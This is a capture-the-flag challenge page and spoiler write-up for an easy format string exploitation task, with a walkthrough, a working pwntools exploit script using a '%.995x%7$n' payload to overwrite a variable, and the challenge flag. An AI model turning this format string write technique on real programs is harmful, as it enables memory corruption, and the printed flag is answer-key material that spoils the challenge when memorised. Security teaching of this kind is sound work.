# Title

## Authors
- @joooooooooooooooooooooooooooooooooooosh

## Category
- Binary Exploit

## Description
I'm trying to learn how to use snprintf(), but the different arguments keep confusing me...

## Difficulty
- Easy

## Points
100

## Files
- vuln: redacted version of the binary
- vuln.c: redacted version of the source code for vuln

## Solution
<details>
<summary>Spoiler</summary>

### Idea
When user input can control/affect the format string used in functions like printf/syslog families, they can leak data from memory and even write to memory (assuming the binary hasn't been fortified to prevent use of %n).

### Walkthrough
1. Format string shenanigans
    - LiveOverflow has some good videos detailing what format string are and how to exploit them (example below).
https://www.youtube.com/watch?v=0WvrSfcdq1I

2. Figure out where i is
    - In order to be able to write to the address of i, we need to make it part of our input so that it ends up on the stack - but make sure it's in little endian hex escaped form (e.g. to write 0xdeadbeef you could use `echo -en "\xef\xbe\xad\xde" | vuln`). Once we've done that, we can append a whole bunch of %x's to our input to leak the stack until we find where i is.

    - Note: I highly recommend separating the %x's (e.g. "|%x|%x|%x|%x") so that you don't go insane trying to figure out where each address starts and ends.

    - Now that we have a bunch of the stack leaked we find the area on the stack where our input starts. In this case since we've been told what the address of i is we can just look for that. It seems to always appear as the 7th entry in the stack for this program.

3. Start overwriting the value of i
    - To make sure we've got everything working, lets just try changing the value of i to *something*. Sending the address of i + "%7$n" will overwrite the value of i to be 4, so we can see we're on the right track.

4. Field width modifiers
    - Since %n writes a value representing how long the formatted string will be up until that point, we can change the value of i by adding more characters. Sending the address of i + "AAAAA%7$n" will overwrite the value of i to be 9, so the 5 A's incremented i's value by 5.

    - However we can't just put 995 As in front of %n, as the buffer doesn't have enough space to store that. What we can do is print out a random value with %x but force it to be (theoretically) 995 characters wide. This way %n will write a value of 999 but our actual input is small enough to fit inside the buffer. Sending the address of i + "%.995x%7$n" will set i to be 999 and give us the flag.

### Script
```python
#!/usr/bin/python3
# this works 9/10 times lol
# just try again if it fails and let ASLR run its magic
import pwn
pwn.context.log_level = 'debug'
p = pwn.process("vuln")
p.recvuntil("@ ")
i_addr = pwn.p32(int(p.recvline().strip(), 16))
# this is how i discovered the right offset to use
# (leak a whole bunch of the stack and manually look for the address of i)
# p.sendline(i_addr+b"|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x")
p.sendline(i_addr+b"%.995x%7$n")
p.interactive()
```

### Flag
`SKYLIGHT{stiLL_b3tt3r_formatt1ng_than_MS_Word}`
</details>
